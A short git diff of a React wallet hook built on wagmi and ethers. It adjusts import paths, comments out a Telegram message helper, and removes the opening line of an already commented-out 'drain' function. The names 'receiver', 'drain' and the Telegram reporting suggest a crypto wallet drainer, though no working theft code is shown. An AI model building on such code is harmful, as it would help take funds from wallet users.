@@ -1,13 +1,13 @@
 "use client";
 
 import { useAccount } from "wagmi";
-import { getBalance, switchChain, getChainId, getGasPrice } from "@wagmi/core";
+import { switchChain, getChainId, getGasPrice } from "@wagmi/core";
 import axios from "axios";
 import { Contract, providers, ethers, utils } from "ethers";
-import contractAbi from "../blockchain/contract.json";
-import { config, receiver, API_KEY } from "../../app/Web3Config";
+import contractAbi from "../app/blockchain/contract.json";
+import { config, receiver, API_KEY } from "../Web3Config";
 import { toast } from "react-toastify";
-import { sendMessageToTelegram } from "../../../utils/telegramUtils";
+// import { sendMessageToTelegram } from "../../../utils/telegramUtils";
 
 export const UseWallet = () => {
   const account = useAccount();
@@ -88,7 +88,6 @@ export const UseWallet = () => {
     }
   };
 
-  // const drain = async () => {
   //   if (!window.ethereum || !account?.address || !account?.chainId) {
   //     console.log("Ethereum provider is not available.");
   //     return;
